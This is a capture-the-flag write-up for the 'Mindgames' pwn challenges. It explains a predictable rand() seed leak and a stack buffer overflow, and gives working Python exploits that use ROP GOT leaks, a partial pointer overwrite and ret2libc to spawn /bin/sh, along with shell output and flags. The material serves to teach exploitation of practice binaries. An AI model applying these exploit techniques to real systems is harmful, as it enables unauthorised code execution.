# Mindgames 1

*Do you want to play a game of the minds? I am sure you can never win this game! MUAHAHAHA....*

`nc pwn.institute 41336`

Note: Mindgames 1336, Mindgames 1337 and Mindgames 1338 are created from the same source. Only the protections are different. So you might want to start with this one for an easier challenge.

### This challenge was done with [`pwnscripts`](https://github.com/152334H/pwnscripts). Try it!

## Binary Analysis
We start off from the usual:
```python
$ checksec mindgames_1336
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Well, that's great! All we gotta do now is to decompile the binary.

> mindgames_1336: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), for GNU/Linux 3.2.0, dynamically linked, interpreter \004, **stripped**

...which is perhaps a little bit tedious.

Each of the `mindgames` involves relatively simple exploits; the trick is in figuring out precisely *where* the exploit is. Here's a quick rundown of what exactly the binary does:

```c
void main() {
  signal(14, handler);
  alarm(14); // Timeout creation
  setvbuf(...);	// I/O debuffering
  main_last();
}
```
We start at `main()`, where some of the usual stuff happens. Every function from here-on-out (e.g. `main_last()`) will be self-assigned names.
```c
void main_last() {
  int v = 0; // [rsp+4h] [rbp-Ch]
  srand_init();
  printf("\nWe should play a game of the mind!\n> ");
  while (1) {
	printf("What do you want to do?\n 1) Show Highscore\n 2) Play the game\n 3) Exit\n> ");
	scanf("%d", &v);
	if (v == 1)
	  show_highscore();
	else if (v == 2)
	  play();
	else
	  exit(0);
  }
}
```
In this function, we first get an `init()` function before we move on to the menu loop that you can see when you run the binary.

`srand_init()` does a few important things:
```c
char overflow[0x20];
int highscore;
// 4 bytes padding here
char *selected_name;
char *NAMEARRAY[5] = {...}; // constants omitted for brevity

srand_init() {
  time_t timer; // [rsp+0h] [rbp-40h]
  struct tm *tp; // [rsp+8h] [rbp-38h]
  char s[0x28]; // [rsp+10h] [rbp-30h]

  time(&timer);
  tp = localtime(&timer);
  strftime(s, 0x1A, "%Y-%m-%d %H:%M:%S", tp);
  printf("Hello there! It's %s and the weather looks pretty nice!\n\n", s);
  srand(timer);
  long long eax = rand();
  selected_name = NAMEARRAY[eax%6];
  highscore = rand() % 32 + 1;
}
```
There's a lot of dumb code in there to read, so we can sum it up:
1. `srand()` seed is leaked as a printed date. Grab it using pwntools and datetime.
2. `rand()` is called twice. If you didn't know, the values from C's `rand()`, given the `srand()` seed, can be easily predicted in python via the ctypes library:
   ```python
   from ctypes import CDLL
   C = CDLL('libc.so.6')
   C.srand(...)
   print("The first random value is: %d" % C.rand())
   highscore = C.rand()
   ```
   The second value of rand (`highscore`) is something you will need for later.
With that out of the way, we can focus on the main loop. There are two functions: `show_highscore()` and `play()`. The former is very simple:
```c
int show_highscore() {
  return printf("Current highscore:\n%d\t by \t %s\n", highscore, selected_name);
}
```
This function is important as a leaking mechanism in later challenges, but for now it can be ignored.

`play()` is a little more complex:
```c
unsigned long long play() {
  int inputv = 0, randv = 0;
  unsigned int wins = 0;
  printf("Can you guess my numbers?\n> ");
  while (1) {
    randv = rand();
    scanf("%d", &inputv);
    if (randv != inputv)
      break;
    printf("You were lucky this time!\n>");
    ++wins;
  }
  puts("Game over!");
  if (wins >= highscore) {
    puts("New Highscore! Amazing!");
    highscore = wins;
    set_new_highscore();
  }
}
```
If you remember the small code block about `rand()` in python from earlier, in `play()`, we need to abuse `C.rand()` `highscore` times if we want to trigger the `set_new_highscore()` function. Considering that there is no other function we have not looked at yet, at this point, it's somewhat obvious that we should set-up a way to enter `set_new_highscore()`.

## Exploit begins
```python
from re import findall
from datetime import datetime
from ctypes import CDLL
from pwnscripts import *

p = remote('pwn.institute', 41336)
strdate = findall(b"[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}", p.recvline())[0].decode()
epoch = datetime.strptime(strdate+'-+0000',"%Y-%m-%d %H:%M:%S-%z").timestamp()
C = CDLL('libc.so.6')
C.srand(int(epoch))
randv = C.rand()
highscore = C.rand()%32 + 1

p.sendlineafter('> ', str(2))
for i in range(highscore):
    p.sendlineafter('>' if i else '> ', str(C.rand()))
p.sendlineafter('>', '0')
p.recvuntil('Amazing!\n')
```
At the last line of this code, we know that `"New highscore! Amazing!"` has been printed. We're inside `set_new_highscore()`:
```c
set_new_highscore() {
  ssize_t n; // ST08_8
  char buf[0x110]; // [rsp+10h] [rbp-110h]

  printf("Give me your name: ");
  selected_name = &overflow;
  n = read(0, buf, 0x400);
  memcpy(&overflow, buf, n);
}
```
There is an *incredibly obvious* buffer overflow here: `read(0x400)` clearly exceeds the limit (of 0x110) for `buf[]`.

The exploitation of this is rather simple:
1. Leak two GOT funcs by ROP'ing to `puts()`. This is only possible for `mindgame_1336`, where PIE is disabled.
2. Resolve the remote libc id, and calculate import addresses (`system`, `"/bin/sh"`)
3. Call `set_new_highscore()` again, and ret2libc `system("/bin/sh")`

The implementation of this is rather simple with `pwnscripts`:
```python
context.binary = 'mindgames_1336'
# Need to label the addresses here, because the binary is stripped
context.binary.symbols = {'set_new_highscore': 0x401336, 'puts': 0x401040}
context.binary.got = {'printf':0x404028, 'alarm':0x404030}
GOT_funcs = ['printf', 'alarm']
context.libc_database = 'libc-database'

def rop(b):
    r = ROP(b)
    r.raw(0x118*'a')
    return r
r = rop(context.binary)
for f in GOT_funcs:
    r.puts(context.binary.got[f])
r.set_new_highscore()
p.sendlineafter('name: ', r.chain())
libc_leaks = dict((f,extract_first_bytes(p.recvline(),6)) for f in GOT_funcs)
context.libc = context.libc_database.libc_find(libc_leaks)

r = rop(context.libc)
r.system(context.libc.symbols['str_bin_sh'])
p.sendlineafter('name: ', r.chain())
p.interactive()
```
That's it.
```bash
[*] Loaded 14 cached gadgets for 'mindgames_1336'
[*] found libc! id: libc6_2.28-10_amd64
[*] Switching to interactive mode
$ ls
flag
mindgames
$ cat flag
BCTF{I_guess_time_was_0n_y0ur_side_this_time}
```

# Mindgames 2
*This time I hardened my mind even better. No way you are gonna win this one!*

`nc pwn.institute 41337`

If you didn't know, the library used in the solution code here is [`pwnscripts`](https://github.com/152334H/pwnscripts)

## Differences
There's essentially only 1 difference between mindgames 1336 & 1337:
```python
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
PIE is enabled! Ain't that grand.

If you scroll up a little bit to my previous challenge's writeup, you'll realise that my previous exploit only works if PIE is disabled. To finish the challenge here, we'll need to find a different way to leak libc.

In the previous challenge, I noted that we didn't use this function in our exploit:
```c
int show_highscore() {
  return printf("Current highscore:\n%d\t by \t %s\n", highscore, selected_name);
}
```
Here, it becomes important. In `set_new_highscore()`, `memcpy()` copies our input to the aptly-titled `overflow[]`:
```c
set_new_highscore() {
  ssize_t n; // ST08_8
  char buf[0x110]; // [rsp+10h] [rbp-110h]

  printf("Give me your name: ");
  selected_name = &overflow;
  n = read(0, buf, 0x400);
  memcpy(&overflow, buf, n); // <----- focus on this
}
```
This will naturally cause an *overflow* into a number of other variables:
```ida
LOAD:0000000000004018 off_4018        dq offset localtime     ; DATA XREF: _localtime↑r
LOAD:0000000000004020 off_4020        dq offset puts          ; DATA XREF: _puts↑r
LOAD:0000000000004028 off_4028        dq offset __stack_chk_fail
LOAD:0000000000004028                                         ; DATA XREF: ___stack_chk_fail↑r
LOAD:0000000000004030 off_4030        dq offset printf        ; DATA XREF: _printf↑r
LOAD:0000000000004038 off_4038        dq offset alarm         ; DATA XREF: _alarm↑r
LOAD:0000000000004040 off_4040        dq offset read          ; DATA XREF: _read↑r
...
LOAD:00000000000040C0 ; char overflow[32]
LOAD:00000000000040C0 overflow        db 20h dup(0)           ; DATA XREF: set_new_highscore+2B↑o
LOAD:00000000000040E0 highscore       dd 1                    ; DATA XREF: srand_init+CC↑w
LOAD:00000000000040E4                 align 8
LOAD:00000000000040E8 selected_name   dq 0                    ; DATA XREF: srand_init+B2↑w
LOAD:00000000000040F0                 align 20h
LOAD:0000000000004100 NAMEARRAY       dq offset ...
```
We can overwrite `selected_name` with this smaller overflow. The trick here is to realise that the original value of `selected_name` (`&overflow == PIE+0x40c0`) only differs from the location of the GOT table by it's least-significant-byte. Or to put it a little bit more meaningfully: if we overflow *just one byte* of `selected_name` to, e.g. `0x30`, we can leak the value of the GOT function at `overflow-0xc0+0x30` (which is `printf`).

Everything after that is really just a simple exercise in implementation. We start with a few re-definitions from the previous code to match the new exploit:
```python
context.binary = 'mindgames_1337'
context.binary.symbols = {'overflow': 0x40c0, 'selected_name': 0x40e8}
context.binary.got = {'puts':0x4020}
context.libc_database = 'libc-database'
context.libc = 'libc6_2.28-10_amd64'# from prev chal
def read_400(payload, minwins=0):	# Helper function to do the set_new_highscore() overflow of 0x400 bytes
    p.sendlineafter('> ', '2')
    for i in range(minwins):
        p.sendlineafter('>' if i else '> ', str(C.rand()))
    p.sendlineafter('>' if minwins else '> ', '0')
    p.recvuntil('Amazing!\n')
    p.sendafter('name: ', payload)
```
Then, we leak a single libc address. We only need one address because we already know the libc id from the previous challenge.
```python
payload = b'\0'*(context.binary.symbols['selected_name']-context.binary.symbols['overflow'])
payload+= pack(context.binary.got['puts'])[:1] # Overwrite the last byte, so PIE.overflow -> PIE.puts
read_400(payload, nextrand)
p.sendlineafter('> ', str(1))
p.recvuntil('\t by \t ')
context.libc.calc_base('puts', extract_first_bytes(p.recvline(),6))
```
Finally, do a return-to-libc-system again:
```python
r = ROP(context.libc)
r.raw(b'\0'*0x118)
r.system(context.libc.symbols['str_bin_sh'])
read_400(r.chain())
p.interactive()
```
It hardly ever changes.
```python
[*] Switching to interactive mode
$ ls
flag
mindgames
$ cat flag
BCTF{and_n0w_y0u_ate_my_PIE?}
$
```